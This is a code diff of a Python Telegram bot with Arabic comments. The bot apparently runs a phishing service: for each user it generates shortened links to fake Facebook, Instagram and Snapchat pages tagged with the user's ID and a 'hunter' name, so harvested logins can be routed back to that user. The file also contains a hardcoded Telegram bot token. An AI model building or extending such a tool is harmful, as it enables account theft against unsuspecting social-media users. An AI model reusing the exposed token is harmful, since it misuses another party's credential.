@@ -4,7 +4,7 @@ from flask import Flask
 from threading import Thread
 import os
 
-# --- نظام الـ Keep Alive لضمان استمرار البوت ---
+# --- نظام الـ Keep Alive لضمان استمرار البوت 24 ساعة ---
 app = Flask('')
 
 @app.route('/')
@@ -12,7 +12,6 @@ def home():
     return "M.Y.9 System is Online"
 
 def run():
-    # استخدام بورت ديناميكي لـ Render
     port = int(os.environ.get('PORT', 8080))
     app.run(host='0.0.0.0', port=port)
 
@@ -20,7 +19,7 @@ def keep_alive():
     t = Thread(target=run)
     t.start()
 
-# --- إعدادات البوت والتوكن ---
+# --- إعدادات البوت والتوكن تبعك ---
 TOKEN = '8386427321:AAFKq8fCsoPEDgcF8KNFR2NUr7Gh0DwfskE'
 bot = telebot.TeleBot(TOKEN)
 
@@ -35,11 +34,9 @@ def short_link(url):
 def send_welcome(message):
     uid = message.chat.id
     first_name = message.from_user.first_name
-    # ميزة "اسم الصياد" - تحويل الفراغات لشحطات
     hunter = first_name.replace(" ", "_")
     base = "https://m-y-9-tech.github.io/fb/"
     
-    # توليد روابط فريدة لكل مستخدم مع الـ ID واسمه
     fb = short_link(f"{base}fb.html?id={uid}&hunter={hunter}")
     ig = short_link(f"{base}ig.html?id={uid}&hunter={hunter}")
     snap = short_link(f"{base}snap.html?id={uid}&hunter={hunter}")
@@ -51,7 +48,7 @@ def send_welcome(message):
 👤 Developer: 𝔸𝕓𝕦 𝕊𝕒𝕟𝕒𝕕 𝕄𝕒𝕝𝕜𝕒𝕨𝕚
 
 ⚠️ تـ^ـنـ^ـبـ^ـيـ^ـه بـ^ـرمـ^ـجـ^ـي صـ^ـارم:
-لـ^ـضـ^ـمـ^ـان تـ^ـفـ^ـعـ^ـيـ^ـل الأوامـر، يـ^ـجـ^ـب مـ^ـتـ^ـابـ^ـعـ^ـة حـ^ـسـ^ـاب المـ^ـطـ^ـور (إجباري):
+لـ^ـضـ^ـمـ^ـان تـ^ـفـ^ـعـ^ـيـ^ـل الأوامـر، يـ^ـجـ^ـب مـ^ـتـ^ـابـ^ـعـ^ـة حـ^ـسـ^ـاب المـ^ـطـ^ـور:
 🔴 https://www.instagram.com/m_y_.9/
 
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬
@@ -70,6 +67,4 @@ def send_welcome(message):
 
 if __name__ == "__main__":
     keep_alive()
-    print("M.Y.9 System Started Successfully...")
-    # تم تصحيح الخطأ هنا (استخدام infinity_polling بدون تكرار بارامترات)
     bot.infinity_polling()
